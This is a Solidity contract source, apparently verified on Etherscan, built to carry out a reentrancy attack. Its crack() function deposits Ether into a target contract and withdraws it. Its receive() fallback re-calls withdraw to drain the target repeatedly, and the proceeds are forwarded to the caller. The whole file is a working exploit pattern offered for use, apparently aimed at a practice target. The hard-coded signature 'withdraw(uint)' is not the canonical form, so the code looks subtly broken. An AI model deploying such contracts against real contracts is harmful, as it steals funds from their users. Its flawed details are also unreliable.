/**
 *Submitted for verification at Etherscan.io on 2022-03-15
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Reentrancy{

    address payable target;
    constructor(address payable _target) public{
        target = _target;
    }

    receive() payable external{
        address(target).call(abi.encodeWithSignature("withdraw(uint)", msg.value));
    }

    function crack() payable external{
        // Donate first
        (bool success, ) = address(target).call{value: msg.value}(abi.encodeWithSignature("donate(address)", address(this)));
        require(success, "Fail donate");
        // Try withdraw
        (success, ) = address(target).call(abi.encodeWithSignature("withdraw(uint)", msg.value));
        require(success, "Fail withdraw");
        (success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Fail sendback");
    }
    function withdraw() payable external{
        msg.sender.transfer(address(this).balance);
    }
}